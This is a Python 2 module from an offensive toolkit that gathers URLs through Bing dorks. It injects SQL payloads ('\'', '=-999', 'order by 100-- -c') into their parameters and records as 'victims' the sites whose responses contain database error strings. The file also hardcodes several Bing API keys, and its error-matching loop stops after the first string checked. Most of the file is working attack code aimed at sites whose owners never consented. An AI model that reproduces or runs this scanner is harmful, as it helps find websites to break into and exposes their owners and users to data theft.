# -*- coding: utf-8 -*-
import sys
sys.path.append('.')
import urllib2
import html2text
import json
import urllib
import random
from colorama import Fore, Back, Style
from colorama import init
from config import config

init()
class module(config):


####Init configuration####
    def __init__(self):
        self.config = config()
        self.cur = self.config.getCursor()
        self.con = self.config.getCon()
        self.targets=""
        self.URLS = []
        self.victims=[]
        self.keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];
        self.preExecution()
##########################

####User define information####
    def preExecution(self):
        while(True):
            option = raw_input("> ")
            if(option=="exit"):
                exit(0)

            if(option=="help"):
                print("#Bing Dork Exampĺe: 'Domain:.ar galeria.php?id=1'");
                print("show victims                     --> Show Victims Post Scan")
                print("clear victims                    --> Clear Victims Post Scan")
                print("export victims {Path/file.txt}   --> Export Victims Post Scan (Append Data)")
                print("set dork {BingDork}              --> set Bing Dork")
                print("set key {BingKey}                --> Add Bing Key or Edit self.keys var")
                print("show keys                        --> Show currents Bing Keys in use")
                print("clear keys                       --> Clear Bing Keys")
                print("exploit                          --> Start atack")
                print("info                             --> Show info of module")
                print("exit                             --> Close Module")

            if(option.find("set dork")>-1):
                self.targets=""
                data = option.split(" ")
                dork = ""

                for parts in range(2,len(data)):
                    dork = dork +" "+ data[parts]

                #print dork
                self.targets = dork

            if(option.find("set key")>-1):
                data = option.split(" ")
                self.keys.append(data[2])

            if(option == "show keys"):
                for key in self.keys:
                    print "Key => "+key

            if(option == "clear victims"):
                self.victims=[]
                print "Clear Done"

            if(option=="show victims"):
                for victim in self.victims:
                    print Fore.RED+"Vulnerable => "+victim
                print(Fore.RESET + Back.RESET + Style.RESET_ALL)

            if(option.find("export victims")>-1):
                data = option.split(" ")
                PathFile=data[2]
                for victim in self.victims:
                    f = open(PathFile,"a");
                    #f.writelines("Vulnerable => "+victim+ '\n');
                    f.writelines(""+victim+ '\n');
                    f.close();

                print "Export Done"

            if(option=="clear keys"):
                self.keys = [];
                print "Clear Done"

            if(option=="show dork"):
                if(len(self.targets)!=0):
                        print "Dork => "+self.targets
                else:
                    print "No targets"

            if(option=="info"):
                self.keys = [];
                print "[*] Module to find vulnerable websites SQL Injection by Bing Dorks"
                print "[*] by hdbreaker"
            if(option=="exploit"):
                self.exploit()
                print(Fore.RESET + Back.RESET + Style.RESET_ALL)
###################################

###Exploit c0de###
    def exploit(self):
        if(len(self.targets)!=0):
            urls = self.bing_search(self.targets,'Web')

            for url in urls:
                self.URLS.append(url);
            self.searcher(self.URLS);

        else:
            print "No targets found";

####def custom user functions (calleable from exploit())####
    def isVulnerable(self,contenido):
        arrayErrors = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i'];
        for error in arrayErrors:
             if(contenido.find(error) > -1):
                return True;
             else:
                return False;

    def searcher(self,arrayUrl):
        vectores=['=\'','=\"', '=-999', '=169 order by 100-- -c'];
        for url in arrayUrl:
            Url = ""+url;
            for vector in vectores:
                Url2 = Url.replace("=",vector);
                try:
                    response = ""+urllib2.urlopen(Url2).read();
                    page = html2text.html2text(response.decode('utf-8',errors='ignore'));

                    contenido = page.lower();

                    if(self.isVulnerable(contenido)):

                        print (Fore.RED + Url2 + " is vulnerable");
                        self.victims.append(Url2)
                    else:
                        print (Fore.GREEN + Url2 + " is not vulnerable");

                except:
                    print(Fore.GREEN + "Ups han error ocurred with this page!");

    def bing_search(self,query, search_type):
        #search_type: Web, Image, News, Video
        key = self.RandomAPIKeys()
        query = urllib.quote(query)
        # create credential for authentication
        user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
        credentials = (':%s' % key).encode('base64')[:-1]
        auth = 'Basic %s' % credentials
        url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/'+search_type+'?Query=%27'+query+'%27&$top=100&$format=json'
        request = urllib2.Request(url)
        request.add_header('Authorization', auth)
        request.add_header('User-Agent', user_agent)
        request_opener = urllib2.build_opener()
        response = request_opener.open(request)
        response_data = response.read()
        json_result = json.loads(response_data)
        urls = [res['Url'] for res in json_result['d']['results']]
        return urls

    def RandomAPIKeys(self):
        index = random.randrange(1,len(self.keys));
        return self.keys[index];

#############################################################

#####Init Module#####
start = module()
#####################